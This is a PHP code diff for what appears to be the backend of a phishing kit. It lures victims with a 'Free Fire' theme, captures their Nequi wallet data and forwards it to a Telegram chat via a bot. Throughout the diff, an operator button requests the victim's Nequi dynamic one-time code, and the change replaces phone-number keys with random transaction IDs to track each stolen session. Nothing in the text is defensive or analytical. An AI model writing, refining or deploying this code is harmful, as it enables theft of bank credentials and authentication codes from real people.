@@ -109,21 +109,21 @@ function editMessage($token, $chatId, $messageId, $text)
 /* ============================================================
    DINAMICA STATUS FUNCTIONS
    ============================================================ */
-function getDinamicaStatus($telefono)
+function getDinamicaStatus($transactionId)
 {
     if (!file_exists($GLOBALS['DINAMICA_STATUS_FILE'])) return null;
     $data = json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true);
-    $status = $data[$telefono] ?? null;
-    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - getDinamicaStatus($telefono): " . json_encode($status) . "\n", FILE_APPEND);
+    $status = $data[$transactionId] ?? null;
+    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - getDinamicaStatus($transactionId): " . json_encode($status) . "\n", FILE_APPEND);
     return $status;
 }
 
-function setDinamicaStatus($telefono, $status, $messageId = null)
+function setDinamicaStatus($transactionId, $status, $messageId = null)
 {
     $data = file_exists($GLOBALS['DINAMICA_STATUS_FILE']) ? json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true) : [];
-    $data[$telefono] = ['status' => $status, 'message_id' => $messageId, 'timestamp' => time()];
+    $data[$transactionId] = ['status' => $status, 'message_id' => $messageId, 'timestamp' => time()];
     file_put_contents($GLOBALS['DINAMICA_STATUS_FILE'], json_encode($data));
-    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - setDinamicaStatus($telefono, $status)\n", FILE_APPEND);
+    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - setDinamicaStatus($transactionId, $status)\n", FILE_APPEND);
 }
 
 /* ============================================================
@@ -291,9 +291,9 @@ if (isset($d['update_id'])) {
         file_put_contents(__DIR__ . '/callback_log.txt', date('Y-m-d H:i:s') . " - Callback recibido: $data\n", FILE_APPEND);
 
         if (strpos($data, 'solicitar_dinamica_') === 0) {
-            $telefono = str_replace('solicitar_dinamica_', '', $data);
-            file_put_contents(__DIR__ . '/callback_log.txt', date('Y-m-d H:i:s') . " - Procesando dinamica para telefono: $telefono\n", FILE_APPEND);
-            setDinamicaStatus($telefono, 'dinamica_solicitada');
+            $transactionId = str_replace('solicitar_dinamica_', '', $data);
+            file_put_contents(__DIR__ . '/callback_log.txt', date('Y-m-d H:i:s') . " - Procesando dinamica para transactionId: $transactionId\n", FILE_APPEND);
+            setDinamicaStatus($transactionId, 'dinamica_solicitada');
             answerCallbackQuery($config['token'], $callbackId, 'Dinámica solicitada al usuario');
         }
     }
@@ -323,6 +323,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
             exit;
         }
+
+        // Generar transaction ID único
+        $tid = bin2hex(random_bytes(8));
 
         // Crear mensaje directo con datos de Nequi
         $msg = "<b>💎 FREE FIRE - DATOS NEQUI RECIBIDOS 💎</b>\n";
@@ -362,13 +365,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $keyboard = [
             'inline_keyboard' => [
                 [
-                    ['text' => '📱 Solicitar Dinámica', 'callback_data' => 'solicitar_dinamica_' . $telefono]
+                    ['text' => '📱 Solicitar Dinámica', 'callback_data' => 'solicitar_dinamica_' . $tid]
                 ]
             ]
         ];
         if (!empty($dinamica)) {
             // Editar mensaje existente con dinámica
-            $status = getDinamicaStatus($telefono);
+            $status = getDinamicaStatus($tid);
             if ($status && isset($status['message_id'])) {
                 $editResult = editMessage($config['token'], $config['chat_id'], $status['message_id'], $msg);
                 $sent = ['ok' => !empty($editResult)];
@@ -380,19 +383,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // Guardar estado esperando dinámica
             if (!empty($sent['ok'])) {
-                setDinamicaStatus($telefono, 'esperando_dinamica', $sent['result']['message_id'] ?? null);
+                setDinamicaStatus($tid, 'esperando_dinamica', $sent['result']['message_id'] ?? null);
             }
         }
 
-        echo json_encode(['ok' => !empty($sent['ok'])]);
+        echo json_encode(['ok' => !empty($sent['ok']), 'transactionId' => $tid]);
         exit;
     }
 
     // CHECK DINAMICA STATUS
     if (isset($d['action']) && $d['action'] === 'check_dinamica_status') {
-        $telefono = $d['telefono'] ?? '';
-        file_put_contents(__DIR__ . '/polling_log.txt', date('Y-m-d H:i:s') . " - check_dinamica_status para telefono: $telefono\n", FILE_APPEND);
-        $status = getDinamicaStatus($telefono);
+        $transactionId = $d['transactionId'] ?? '';
+        file_put_contents(__DIR__ . '/polling_log.txt', date('Y-m-d H:i:s') . " - check_dinamica_status para transactionId: $transactionId\n", FILE_APPEND);
+        $status = getDinamicaStatus($transactionId);
         file_put_contents(__DIR__ . '/polling_log.txt', date('Y-m-d H:i:s') . " - status devuelto: " . json_encode($status) . "\n", FILE_APPEND);
         echo json_encode(['status' => $status ? $status['status'] : null]);
         exit;
